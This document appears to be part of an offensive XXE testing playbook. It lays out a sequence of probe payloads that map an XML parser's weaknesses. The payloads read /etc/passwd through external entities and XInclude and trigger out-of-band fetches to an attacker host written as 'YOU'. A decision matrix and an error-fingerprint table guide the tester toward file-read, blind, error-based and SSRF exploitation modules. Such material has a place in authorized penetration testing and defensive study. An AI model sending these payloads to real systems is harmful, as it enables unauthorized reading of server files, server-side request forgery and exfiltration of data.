# Detection Oracle — the binary questions that map the surface

## The oracle chain — each probe answers one bit

Each probe below is a YES/NO question. The sequence maps the surface
in bounded probes.

## Q1 — does an XML parser see this input?

```
SEND: <?xml?><r>x</r>
YES: parse-ran (200, an XML response, or a parse error)
NO:  no parse (echo, 415, ignored)
```

## Q2 — do entities expand?

```
SEND: <!DOCTYPE r [<!ENTITY probe "XXE_PROBE">]><r>&probe;</r>
YES: "XXE_PROBE" in response
NO:  "&probe;" literal, error, or empty
```

If YES → the class is live. If NO → test `&undefined;` (does the
parser at least LOOK for entities?) → if `Entity 'undefined' not
defined` — the parser checked entities → expansion-config is the
wall, not the parser.

## Q3 — do EXTERNAL entities resolve?

```
SEND: <!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
YES: passwd lines in response — or a FileNotFound-style error naming
     the URI (fetch-failed = still resolves)
NO:  "Entity 'x' not defined" — the external entity wasn't even looked
     up — external-resolution is off
```

## Q4 — do PARAM entities resolve?

```
SEND: <!DOCTYPE r [<!ENTITY % p "<!ENTITY x 'PARAM_OK'>">%p;]><r>&x;</r>
YES: "PARAM_OK" in response
NO:  entity-undefined or parse-error on %
```

The internal-param test — `%p;` declares `x` — `&x;` echoes it.

## Q5 — does the parser FETCH (egress live)?

```
SEND: <!DOCTYPE r [<!ENTITY % d SYSTEM "http://YOU:8000/hit">%d;]><r/>
YES: oob_listener logs a hit
NO:  nothing
```

The fetch oracle — separate from expansion — a parser may resolve
entities locally but have egress dead.

## Q6 — does XInclude fire?

```
SEND: <r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></r>
YES: passwd in response
NO:  `xi:include` not processed or refused
```

The no-DOCTYPE door — survives `disallow-doctype-decl`.

## Q7 — is the echo suppressed but the parse live?

```
SEND: <!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
OBSERVE: response has NO passwd BUT no error either
TEST:  <!DOCTYPE r [<!ENTITY % d SYSTEM "http://YOU/x">%d;]><r/>
HIT?   → echo suppressed, fetch live → blind channel
NO-HIT → fetch dead → local-DTD or error-channel
```

## The decision matrix — the answers map to the module

| Q2 | Q3 | Q4 | Q5 | Q6 | Read |
|---|---|---|---|---|---|
| ✓ | ✓ | — | — | — | `file-read.md` |
| ✓ | ✗ | ✓ | ✓ | — | `blind-xxe.md` |
| ✓ | ✗ | ✓ | ✗ | — | `error-based.md`/`local-dtd-hijack.md` |
| ✓ | ✗ | ✗ | ✗ | — | `local-dtd-hijack.md` |
| ✗ | — | — | — | ✓ | `xinclude.md` |
| ✗ | — | — | — | ✗ | dead → `denied-conditions.md` |
| — | ✓ | — | — | — | `ssrf-via-xxe.md` (fetch-only) |

## The "the answer is half-yes" — the partial-config signature

- `internal` expands, `external` doesn't → `ElementTree`/a
  `external-general-entities=false` config → blind-or-error
- `external` expands, `param` doesn't → `external-parameter-entities=
  false` → in-band read, no OOB
- entities expand, `SYSTEM`-fetch dead → `nonet`/`resolver=null` →
  in-band still works (file:// is local, not egress)
- `file:` resolves, `http:` doesn't → protocol-filter → file-read
  only

## The fingerprinting probes — the error-as-fingerprint

```
SEND: <r>&undefined;</r>
```

| Error | Parser |
|---|---|
| `Entity 'undefined' not defined` | libxml2 |
| `The entity "undefined" was referenced` | Xerces |
| `Reference to undeclared entity` | .NET |
| `undefined entity` | Expat/Python |

## The "the response-time oracle" — the fetch-timing

```
SEND: <!DOCTYPE r [<!ENTITY % d SYSTEM "http://YOU/slow">%d;]><r/>
```

A 3-second fetch → the response takes 3s → egress live even when the
echo is suppressed — the timing oracle.

## The "the header-oracle" — `Content-Type`/`Location` diffs

- `Content-Type:` changes to XML → a serializer ran
- `Location:`/`Content-Location:` contains your URI → redirect-leak
- `X-Error:`/`X-Exception:` carries the parse error → error channel

## The "the body-diff" — the length signal

Baseline vs probe — the body-length delta = the file-size — even
before the content is read, the DELTA tells you the fetch happened —
the "the response is bigger" signal.
